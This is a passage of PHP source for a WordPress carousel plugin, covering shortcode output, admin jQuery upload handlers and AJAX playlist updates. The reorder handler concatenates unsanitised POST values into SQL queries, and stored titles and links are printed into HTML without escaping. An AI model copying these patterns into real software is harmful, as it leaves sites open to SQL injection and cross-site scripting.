		$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."magic_carousel_playlist) WHERE carouselid = %d ORDER BY ord",$_SESSION['xid'] );
		$result = $wpdb->get_results($safe_sql,ARRAY_A);

		/*$safe_sql=$wpdb->prepare( "SELECT width,height FROM (".$wpdb->prefix ."magic_carousel_settings) WHERE id = %d",$_SESSION['xid'] );
		$row_settings = $wpdb->get_row($safe_sql);		*/

		//$_POST=magic_carousel_unstrip_array($_POST);
		include_once($magic_carousel_path . 'tpl/playlist.php');
	}
}





function magic_carousel_help_page()
{
	//include_once(plugins_url('tpl/help.php', __FILE__));
	global $magic_carousel_path;
	include_once($magic_carousel_path . 'tpl/help.php');
}

function magic_carousel_generate_preview_code($carouselID) {
	global $wpdb;

	$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."magic_carousel_settings) WHERE id = %d",$carouselID );
	$row = $wpdb->get_row($safe_sql,ARRAY_A);
	$row=magic_carousel_unstrip_array($row);
	//echo $wpdb->last_query;


	$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."magic_carousel_playlist) WHERE carouselid = %d ORDER BY ord",$carouselID );
	$result = $wpdb->get_results($safe_sql,ARRAY_A);
	$playlist_str='';
	foreach ( $result as $row_playlist ) {

		$row_playlist=magic_carousel_unstrip_array($row_playlist);

		$img_over='';
		if ($row_playlist['img']!='') {
			if (strpos($row_playlist['img'], 'wp-content',9)===false)
				list($width, $height, $type, $attr) = getimagesize($row_playlist['img']);
			else
				list($width, $height, $type, $attr) = getimagesize( ABSPATH.substr($row_playlist['img'],strpos($row_playlist['img'], 'wp-content',9)) );
			$img_over='<img src="'.$row_playlist['img'].'" width="'.$width.'" height="'.$height.'" alt="'.$row_playlist['title'].'"  title="'.$row_playlist['title'].'" />';
			//$img_over='<img src="'.$row_playlist['img'].'" width="'.$width.'" height="'.$height.'" style="width:'.$width.'px; height:'.$height.'px;" alt="'.$row_playlist['title'].'"  title="'.$row_playlist['title'].'" />';
		}

		$data_audio='';
		$data_video='';
		if ($row_playlist['data_audio']!='') {
			$data_audio=substr($row_playlist['data_audio'],0,strlen($row_playlist['data_audio'])-4);;
		}
		if ($row_playlist['data_video_selfhosted']!='') {
			if (strpos($row_playlist['data_video_selfhosted'],'.webm')!=false)
				$data_video=substr($row_playlist['data_video_selfhosted'],0,strlen($row_playlist['data_video_selfhosted'])-5);
			else
				$data_video=substr($row_playlist['data_video_selfhosted'],0,strlen($row_playlist['data_video_selfhosted'])-4);
		}



		$playlist_str.='<li data-bottom-thumb="'.$row_playlist['data_bottom_thumb'].'" data-title="'.$row_playlist['title'].'" data-link="'.$row_playlist['data-link'].'" data-target="'.$row_playlist['data-target'].'" data-large-image="'.$row_playlist['data_large_image'].'" data-video-vimeo="'.$row_playlist['data-video-vimeo'].'" data-video-youtube="'.$row_playlist['data-video-youtube'].'" data-audio="'.$data_audio.'" data-video-selfhosted="'.$data_video.'" >'.$img_over.'</li>';

	}


	$carousel_function='';
	$myxloader='';
	$list_name='';
	$the_parameters='';

			$carousel_function='magic_carousel';
			$myxloader='<div class="myloader"></div>';
			$list_name='magic_carousel_list';
			$the_parameters='skin:"'.$row["skin"].'",
				responsive:'.$row["responsive"].',
				responsiveRelativeToBrowser:'.$row["responsiveRelativeToBrowser"].',
				width:'.$row["width"].',
				height:'.$row["height"].',
				width100Proc:'.$row["width100Proc"].',
				height100Proc:false,
				centerPlugin:'.$row["centerPlugin"].',
				autoPlay:'.$row["autoPlay"].',
				numberOfVisibleItems:'.$row["numberOfVisibleItems"].',
				verticalAdjustment:'.$row["verticalAdjustment"].',
				elementsHorizontalSpacing:'.$row["elementsHorizontalSpacing"].',
				elementsVerticalSpacing:'.$row["elementsVerticalSpacing"].',
				animationTime:'.$row["animationTime"].',
				easing:"'.$row["easing"].'",
				resizeImages:'.$row["resizeImages"].',
				showElementTitle:'.$row["showElementTitle"].',
				titleColor:"#'.$row["titleColor"].'",
				imageWidth:'.$row["imageWidth"].',
				imageHeight:'.$row["imageHeight"].',
				border:'.$row["border"].',
				borderColorOFF:"'.(($row["borderColorOFF"]!='transparent')?'#':'').$row["borderColorOFF"].'",
				borderColorON:"'.(($row["borderColorON"]!='transparent')?'#':'').$row["borderColorON"].'",
				enableTouchScreen:'.$row["enableTouchScreen"].',
				target:"'.$row["target"].'",
				absUrl:"'.plugins_url("", __FILE__).'/perspective/",
				showAllControllers:'.$row["showAllControllers"].',
				showNavArrows:'.$row["showNavArrows"].',
				showOnInitNavArrows:'.$row["showOnInitNavArrows"].',
				autoHideNavArrows:'.$row["autoHideNavArrows"].',
				showBottomNav:'.$row["showBottomNav"].',
				showOnInitBottomNav:'.$row["showOnInitBottomNav"].',
				autoHideBottomNav:'.$row["autoHideBottomNav"].',
				showPreviewThumbs:'.$row["showPreviewThumbs"].',
				nextPrevMarginTop:'.$row["nextPrevMarginTop"].',
				playMovieMarginTop:'.$row["playMovieMarginTop"].',
				bottomNavMarginBottom:'.$row["bottomNavMarginBottom"].',
				circleLeftPositionCorrection:'.$row["circleLeftPositionCorrection"].',
				circleTopPositionCorrection:'.$row["circleTopPositionCorrection"].',
				showCircleTimer:'.$row["showCircleTimer"].',
				circleRadius:'.$row["circleRadius"].',
				circleLineWidth:'.$row["circleLineWidth"].',
				circleColor:"#'.$row["circleColor"].'",
				circleAlpha:'.$row["circleAlpha"].',
				behindCircleColor:"#'.$row["behindCircleColor"].'",
				behindCircleAlpha:'.$row["behindCircleAlpha"];

	return '<script>
		jQuery(function() {
			jQuery("#'.$carousel_function.'_'.$row["id"].'").'.$carousel_function.'({'.
				$the_parameters.
			'});

			jQuery(document).ready(function(){
				jQuery("a[rel^=\'prettyPhoto\']").prettyPhoto({
					default_width: jQuery(window).width()/'.$row["lightbox_width_divider"].',
					default_height: jQuery(window).width()/'.$row["lightbox_height_divider"].',
					social_tools:false,
					callback: function(){
						jQuery.magic_carousel.continueAutoplay();
					}
				});
			});
		});
	</script>
            <div id="'.$carousel_function.'_'.$row["id"].'">'.$myxloader.'<ul class="'.$list_name.'">'.$playlist_str.'</ul></div>';
}


function magic_carousel_shortcode($atts, $content=null) {
	global $wpdb;

	shortcode_atts( array('settings_id'=>''), $atts);
	if ($atts['settings_id']=='')
		$atts['settings_id']=1;

	return magic_carousel_generate_preview_code($atts['settings_id']);

}



register_activation_hook(__FILE__,"magic_carousel_activate"); //activate plugin and create the database
register_uninstall_hook(__FILE__, 'magic_carousel_uninstall'); // on unistall delete all databases
add_action('init', 'magic_carousel_init_sessions');	// initialize sessions
add_action('init', 'magic_carousel_load_styles');	// loads required styles
add_action('init', 'magic_carousel_load_scripts');			// loads required scripts
add_action('admin_menu', 'magic_carousel_plugin_menu'); // create menus
add_shortcode('magic_carousel', 'magic_carousel_shortcode');				// MAGIC-CAROUSEL shortcode









/** OTHER FUNCTIONS **/

//stripslashes for an entire array
function magic_carousel_unstrip_array($array){
	if (is_array($array)) {
		foreach($array as &$val){
			if(is_array($val)){
				$val = unstrip_array($val);
			} else {
				$val = stripslashes($val);

			}
		}
	}
	return $array;
}







/* ajax update playlist record */

add_action('admin_head', 'magic_carousel_update_playlist_record_javascript');

function magic_carousel_update_playlist_record_javascript() {
	global $wpdb;
	//Set Your Nonce
	$magic_carousel_update_playlist_record_ajax_nonce = wp_create_nonce("magic_carousel_update_playlist_record-special-string");
	$magic_carousel_preview_record_ajax_nonce = wp_create_nonce("magic_carousel_preview_record-special-string");


	if(strpos($_SERVER['PHP_SELF'], 'wp-admin') !== false) {
		$page = (isset($_GET['page'])) ? $_GET['page'] : '';
		if(preg_match('/magic_carousel/i', $page)) {
?>




<script type="text/javascript" >

//delete the entire record
function magic_carousel_delete_entire_record (delete_id) {
	if (confirm('Are you sure?')) {
		jQuery("#magic_carousel_sortable").sortable('disable');
		jQuery("#"+delete_id).css("display","none");
		//jQuery("#magic_carousel_sortable").sortable('refresh');
		jQuery("#magic_carousel_updating_witness").css("display","block");
		var data = "action=magic_carousel_update_playlist_record&security=<?php echo $magic_carousel_update_playlist_record_ajax_nonce; ?>&updateType=magic_carousel_delete_entire_record&delete_id="+delete_id;
		// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
		jQuery.post(ajaxurl, data, function(response) {
			jQuery("#magic_carousel_sortable").sortable('enable');
			jQuery("#magic_carousel_updating_witness").css("display","none");
			//alert('Got this from the server: ' + response);
		});
	}
}











function magic_carousel_process_val(val,cssprop) {
	retVal=parseInt(val.substring(0, val.length-2));
	if (cssprop=="top")
		retVal=retVal-148;
	return retVal;
}






function showDialogPreview(theCarouselID) {  //load content and open dialog
	var data ="action=magic_carousel_preview_record&security=<?php echo $magic_carousel_preview_record_ajax_nonce; ?>&theCarouselID="+theCarouselID;

	// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
	jQuery.post(ajaxurl, data, function(response) {
		//jQuery("#previewDialog").html(response);
		jQuery('#previewDialogIframe').attr('src','<?php echo plugins_url("tpl/preview.html?d=".time(), __FILE__)?>');
		jQuery("#previewDialog").dialog("open");
	});
}



jQuery(document).ready(function($) {
	/*PREVIEW DIALOG BOX*/
	jQuery( "#previewDialog" ).dialog({
	  minWidth:1200,
	  minHeight:500,
	  title:"Carousel Preview",
	  modal: true,
	  autoOpen:false,
	  hide: "fade",
	  resizable: false,
	  open: function() {
		//jQuery( this ).html();
	  },
	  close: function() {
		//jQuery("#previewDialog").html('');
		jQuery('#previewDialogIframe').attr('src','');
	  }
	});

	/* THE PLAYLIST */
	if (jQuery('#magic_carousel_sortable').length) {
		jQuery( '#magic_carousel_sortable' ).sortable({
			placeholder: "ui-state-highlight",
			start: function(event, ui) {
	            ord_start = ui.item.prevAll().length + 1;
	        },
			update: function(event, ui) {
	        	jQuery("#magic_carousel_sortable").sortable('disable');
	        	jQuery("#magic_carousel_updating_witness").css("display","block");
				var ord_stop=ui.item.prevAll().length + 1;
				var elem_id=ui.item.attr("id");
				//alert (ui.item.attr("id"));
				//alert (ord_start+' --- '+ord_stop);
				var data = "action=magic_carousel_update_playlist_record&security=<?php echo $magic_carousel_update_playlist_record_ajax_nonce; ?>&updateType=change_ord&ord_start="+ord_start+"&ord_stop="+ord_stop+"&elem_id="+elem_id;
				// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
				jQuery.post(ajaxurl, data, function(response) {
					jQuery("#magic_carousel_sortable").sortable('enable');
					jQuery("#magic_carousel_updating_witness").css("display","none");
					//alert('Got this from the server: ' + response);
				});
			}
		});
	}



	<?php
		$rows_count = $wpdb->get_var( $wpdb->prepare("SELECT COUNT(*) FROM ". $wpdb->prefix . "magic_carousel_playlist WHERE carouselid = %d ORDER BY ord",$_SESSION['xid'] ) );
//$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."magic_carousel_playlist) WHERE carouselid = %d ORDER BY ord",$_SESSION['xid'] );
		for ($i=1;$i<=$rows_count;$i++) {
	?>

	jQuery('#upload_img_button_magic_carousel_<?php echo $i?>').click(function(event) {
			var file_frame;
			event.preventDefault();
			// If the media frame already exists, reopen it.
			if ( file_frame ) {
				file_frame.open();
				return;
			}
			// Create the media frame.
			file_frame = wp.media.frames.file_frame = wp.media({
				title: jQuery( this ).data( 'uploader_title' ),
				button: {
				text: jQuery( this ).data( 'uploader_button_text' ),
				},
				multiple: false // Set to true to allow multiple files to be selected
			});
			// When an image is selected, run a callback.
			file_frame.on( 'select', function() {
				// We set multiple to false so only get one image from the uploader
				attachment = file_frame.state().get('selection').first().toJSON();
				// Do something with attachment.id and/or attachment.url here
				//alert (attachment.url);
				document.forms["form-playlist-magic_carousel-"+<?php echo $i?>].img.value=attachment.url;
				jQuery('#img_'+<?php echo $i?>).attr('src',attachment.url);
			});
			// Finally, open the modal
			file_frame.open();
	});


	jQuery('#upload_thumb_button_magic_carousel_<?php echo $i?>').click(function(event) {
			var file_frame;
			event.preventDefault();
			// If the media frame already exists, reopen it.
			if ( file_frame ) {
				file_frame.open();
				return;
			}
			// Create the media frame.
			file_frame = wp.media.frames.file_frame = wp.media({
				title: jQuery( this ).data( 'uploader_title' ),
				button: {
				text: jQuery( this ).data( 'uploader_button_text' ),
				},
				multiple: false // Set to true to allow multiple files to be selected
			});
			// When an image is selected, run a callback.
			file_frame.on( 'select', function() {
				// We set multiple to false so only get one image from the uploader
				attachment = file_frame.state().get('selection').first().toJSON();
				// Do something with attachment.id and/or attachment.url here
				//alert (attachment.url);
				document.forms["form-playlist-magic_carousel-"+<?php echo $i?>].data_bottom_thumb.value=attachment.url;
				jQuery('#data_bottom_thumb_'+<?php echo $i?>).attr('src',attachment.url);
			});
			// Finally, open the modal
			file_frame.open();
	});


	jQuery('#upload_largeimg_button_magic_carousel_<?php echo $i?>').click(function(event) {
			var file_frame;
			event.preventDefault();
			// If the media frame already exists, reopen it.
			if ( file_frame ) {
				file_frame.open();
				return;
			}
			// Create the media frame.
			file_frame = wp.media.frames.file_frame = wp.media({
				title: jQuery( this ).data( 'uploader_title' ),
				button: {
				text: jQuery( this ).data( 'uploader_button_text' ),
				},
				multiple: false // Set to true to allow multiple files to be selected
			});
			// When an image is selected, run a callback.
			file_frame.on( 'select', function() {
				// We set multiple to false so only get one image from the uploader
				attachment = file_frame.state().get('selection').first().toJSON();
				// Do something with attachment.id and/or attachment.url here
				//alert (attachment.url);
				document.forms["form-playlist-magic_carousel-"+<?php echo $i?>].data_large_image.value=attachment.url;
				jQuery('#data_large_image_'+<?php echo $i?>).attr('src',attachment.url);
			});
			// Finally, open the modal
			file_frame.open();
	});


	jQuery('#upload_video_button_magic_carousel_<?php echo $i?>').click(function(event) {
			var file_frame;
			event.preventDefault();
			// If the media frame already exists, reopen it.
			if ( file_frame ) {
				file_frame.open();
				return;
			}
			// Create the media frame.
			file_frame = wp.media.frames.file_frame = wp.media({
				title: jQuery( this ).data( 'uploader_title' ),
				button: {
				text: jQuery( this ).data( 'uploader_button_text' ),
				},
				multiple: false // Set to true to allow multiple files to be selected
			});
			// When an image is selected, run a callback.
			file_frame.on( 'select', function() {
				// We set multiple to false so only get one image from the uploader
				attachment = file_frame.state().get('selection').first().toJSON();
				// Do something with attachment.id and/or attachment.url here
				//alert (attachment.url);
				document.forms["form-playlist-magic_carousel-"+<?php echo $i?>].data_video_selfhosted.value=attachment.url;
				//jQuery('#data_large_image_'+<?php echo $i?>).attr('src',attachment.url);
			});
			// Finally, open the modal
			file_frame.open();
	});



	jQuery('#upload_audio_button_magic_carousel_<?php echo $i?>').click(function(event) {
			var file_frame;
			event.preventDefault();
			// If the media frame already exists, reopen it.
			if ( file_frame ) {
				file_frame.open();
				return;
			}
			// Create the media frame.
			file_frame = wp.media.frames.file_frame = wp.media({
				title: jQuery( this ).data( 'uploader_title' ),
				button: {
				text: jQuery( this ).data( 'uploader_button_text' ),
				},
				multiple: false // Set to true to allow multiple files to be selected
			});
			// When an image is selected, run a callback.
			file_frame.on( 'select', function() {
				// We set multiple to false so only get one image from the uploader
				attachment = file_frame.state().get('selection').first().toJSON();
				// Do something with attachment.id and/or attachment.url here
				//alert (attachment.url);
				document.forms["form-playlist-magic_carousel-"+<?php echo $i?>].data_audio.value=attachment.url;
				//jQuery('#data_large_image_'+<?php echo $i?>).attr('src',attachment.url);
			});
			// Finally, open the modal
			file_frame.open();
	});


	jQuery("#form-playlist-magic_carousel-<?php echo $i?>").submit(function(event) {

		/* stop form from submitting normally */
		event.preventDefault();

		//show loading image
		jQuery('#ajax-message-<?php echo $i?>').html('<img src="<?php echo plugins_url('magic_carousel/images/ajax-loader.gif', dirname(__FILE__))?>" />');
		var data ="action=magic_carousel_update_playlist_record&security=<?php echo $magic_carousel_update_playlist_record_ajax_nonce; ?>&"+jQuery("#form-playlist-magic_carousel-<?php echo $i?>").serialize();

		// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
		jQuery.post(ajaxurl, data, function(response) {
			//alert('Got this from the server: ' + response);
			//alert(jQuery("#form-playlist-magic_carousel-<?php echo $i?>").serialize());
			var new_img = '';
			if (document.forms["form-playlist-magic_carousel-<?php echo $i?>"].img.value!='')
				new_img=document.forms["form-playlist-magic_carousel-<?php echo $i?>"].img.value;
			jQuery('#top_image_'+document.forms["form-playlist-magic_carousel-<?php echo $i?>"].id.value).attr('src',new_img);
			jQuery('#ajax-message-<?php echo $i?>').html(response);
		});
	});
	<?php } ?>

});
</script>
<?php
		}
	}
}

//magic_carousel_update_playlist_record is the action=magic_carousel_update_playlist_record

add_action('wp_ajax_magic_carousel_update_playlist_record', 'magic_carousel_update_playlist_record_callback');

function magic_carousel_update_playlist_record_callback() {

	check_ajax_referer( 'magic_carousel_update_playlist_record-special-string', 'security' ); //security=<?php echo $magic_carousel_update_playlist_record_ajax_nonce;
	global $wpdb;
	global $magic_carousel_messages;
	$errors_arr=array();
	//$wpdb->show_errors();

	//delete entire record
	//if ($_POST['updateType']=='magic_carousel_delete_entire_record') {
	if (array_key_exists('updateType', $_POST) && $_POST['updateType']=='magic_carousel_delete_entire_record') {
		$delete_id=$_POST['delete_id'];
		$safe_sql=$wpdb->prepare("SELECT * FROM ".$wpdb->prefix."magic_carousel_playlist WHERE id = %d",$delete_id);
		$row = $wpdb->get_row($safe_sql, ARRAY_A);
		$row=magic_carousel_unstrip_array($row);

		//delete the entire record
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."magic_carousel_playlist WHERE id = %d",$delete_id));
		//update the order for the rest ord=ord-1 for > ord
		$wpdb->query($wpdb->prepare("UPDATE ".$wpdb->prefix."magic_carousel_playlist SET ord=ord-1 WHERE carouselid = %d and  ord>".$row['ord'],$_SESSION['xid']));
	}

	//update elements order
	//if ($_POST['updateType']=='change_ord') {
	if (array_key_exists('updateType', $_POST) && $_POST['updateType']=='change_ord') {
		$sql_arr=array();
		$ord_start=$_POST['ord_start'];
		$ord_stop=$_POST['ord_stop'];
		$elem_id=(int)$_POST['elem_id'];
		$ord_direction='+1';
		if ($ord_start<$ord_stop)
			$sql_arr[]="UPDATE ".$wpdb->prefix."magic_carousel_playlist SET ord=ord-1  WHERE carouselid = ".$_SESSION['xid']." and ord>".$ord_start." and ord<=".$ord_stop;
		else
			$sql_arr[]="UPDATE ".$wpdb->prefix."magic_carousel_playlist SET ord=ord+1  WHERE carouselid = ".$_SESSION['xid']." and ord>=".$ord_stop." and ord<".$ord_start;
		$sql_arr[]="UPDATE ".$wpdb->prefix."magic_carousel_playlist SET ord=".$ord_stop." WHERE id=".$elem_id;

		//echo "elem_id: ".$elem_id."----ord_start: ".$ord_start."----ord_stop: ".$ord_stop;
		foreach ($sql_arr as $sql)
			$wpdb->query($sql);
	}




	//submit update
	/*if (empty($_POST['img']))
		$errors_arr[]=$magic_carousel_messages['empty_img'];*/

	$theid=isset($_POST['id'])?$_POST['id']:0;
	if($theid>0 && !count($errors_arr)) {
		/*$except_arr=array('Submit'.$theid,'id','ord','action','security','updateType','uniqueUploadifyID');
		foreach ($_POST as $key=>$val){
			if (in_array($key,$except_arr)) {
				unset($_POST[$key]);
			}
		}*/
		//update playlist
		$wpdb->update(
			$wpdb->prefix .'magic_carousel_playlist',
				array(
				'img' => $_POST['img'],
				'title' => $_POST['title'],
				'data-link' => $_POST['data-link'],
				'data-target' => $_POST['data-target'],
				'data_bottom_thumb' => $_POST['data_bottom_thumb'],
				'data_large_image' => $_POST['data_large_image'],
				'data-video-youtube' => $_POST['data-video-youtube'],
				'data-video-vimeo' => $_POST['data-video-vimeo'],
				'data_video_selfhosted' => $_POST['data_video_selfhosted'],
				'data_audio' => $_POST['data_audio']
				),
			array( 'id' => $theid )
		);



		?>
			<div id="message" class="updated"><p><?php echo $magic_carousel_messages['data_saved'];?></p></div>
	<?php
	} else if (!isset($_POST['updateType'])) {
		$errors_arr[]=$magic_carousel_messages['invalid_request'];
	}
    //echo $theid;

	if (count($errors_arr)) { ?>
		<div id="error" class="error"><p><?php echo implode("<br>", $errors_arr);?></p></div>
	<?php }

	die(); // this is required to return a proper result
}















add_action('wp_ajax_magic_carousel_preview_record', 'magic_carousel_preview_record_callback');

function magic_carousel_preview_record_callback() {
	check_ajax_referer( 'magic_carousel_preview_record-special-string', 'security' );
	global $wpdb;
	//echo magic_carousel_generate_preview_code($_POST['theCarouselID']);
	$safe_sql=$wpdb->prepare( "SELECT skin FROM (".$wpdb->prefix ."magic_carousel_settings) WHERE id = %d",$_POST['theCarouselID'] );
	$row = $wpdb->get_row($safe_sql,ARRAY_A);
	$row=magic_carousel_unstrip_array($row);

	$aux_val='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
				<html>
					<head>
					<link href="'.plugins_url('perspective/css/magic_carousel.css', __FILE__).'" rel="stylesheet" type="text/css">
					<link href="'.plugins_url('perspective/css/prettyPhoto.css', __FILE__).'" rel="stylesheet" type="text/css">

						<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script>
						<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js"></script>
						<script src="'.plugins_url('perspective/js/jquery.touchSwipe.min.js', __FILE__).'" type="text/javascript"></script>
						<script src="'.plugins_url('perspective/js/magic_carousel.js', __FILE__).'" type="text/javascript"></script>
						<script src="'.plugins_url('perspective/js/jquery.prettyPhoto.js', __FILE__).'" type="text/javascript"></script>
					</head>
					<body style="padding:0px;margin:0px 0px 0px 0px;background:#CCCCCC;">';

	$aux_val.=magic_carousel_generate_preview_code($_POST['theCarouselID']);
	$aux_val.="</body>
				</html>";
	$filename=plugin_dir_path(__FILE__) . 'tpl/preview.html';
	$fp = fopen($filename, 'w+');
	$fwrite = fwrite($fp, $aux_val);

	echo $fwrite;

	die(); // this is required to return a proper result
}



?>
